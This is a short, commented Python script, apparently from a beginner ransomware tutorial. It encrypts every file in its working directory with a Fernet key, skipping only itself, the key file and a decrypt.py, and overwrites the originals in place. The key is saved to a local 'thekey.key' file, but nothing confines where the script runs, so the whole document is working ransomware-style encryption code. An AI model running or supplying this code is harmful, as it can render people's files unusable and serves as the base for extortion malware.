import os
from cryptography.fernet import Fernet #importing cryptography lib
#creating file list where we store the file name list inside a
#directory
files = []
for file in os.listdir():
    #checking if the current file is itself or the key file or the decryptfile else it will also encrypt those again
    #we dont want that to happen
    if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)
#generating a new key and storing into a fle name "thekey.key" 
key = Fernet.generate_key()
#write binary mode 
with open("thekey.key","wb") as thekey:
    thekey.write(key)

#opening files reading those files in a variable called as "content" and encrypting those contents using the above key 
#and writing backed encrypted contents to the same file
for file in files:
    with open(file,"rb") as thefiles:
        content = thefiles.read()
    contents_encrypted = Fernet(key).encrypt(content)
    with open(file,"wb") as thefiles:
        thefiles.write(contents_encrypted)


